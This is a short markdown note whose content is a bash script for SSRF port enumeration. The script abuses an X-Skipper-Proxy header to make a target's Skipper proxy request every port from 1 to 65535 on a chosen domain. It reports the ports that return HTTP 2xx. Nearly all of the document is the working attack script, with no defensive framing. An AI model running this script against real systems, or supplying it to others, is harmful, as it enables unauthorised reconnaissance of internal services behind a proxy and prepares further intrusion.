# SSRF

SSRF Port Enumerator via Skipper Proxy SSRF

```bash
#!/bin/bash

# Greeting message
echo "Welcome to the SSRF Port Enumeration Script"

# Prompt the user for the domain
read -p "Enter the domain to test: " domain

# Prompt the user for the protocol, defaulting to HTTP
read -p "Enter the protocol to use (http/https) [http]: " protocol
protocol=${protocol:-http}

# Total number of ports to scan
total_ports=65535

# Run curl in parallel for ports 1 to 65535 using xargs with a progress bar
seq 1 $total_ports | pv -l -s $total_ports | xargs -P 10 -I {} sh -c '
    url='"$protocol"'://'"$domain"':{}
    response=$(curl -s -o /dev/null -w "%{http_code}" $url -H "X-Skipper-Proxy: $url")
    first_char=$(echo $response | cut -c1)
    if [ "$first_char" -eq "2" ]; then
        echo "Successful response on port {}: HTTP $response - URL: $url"
    fi
'
```
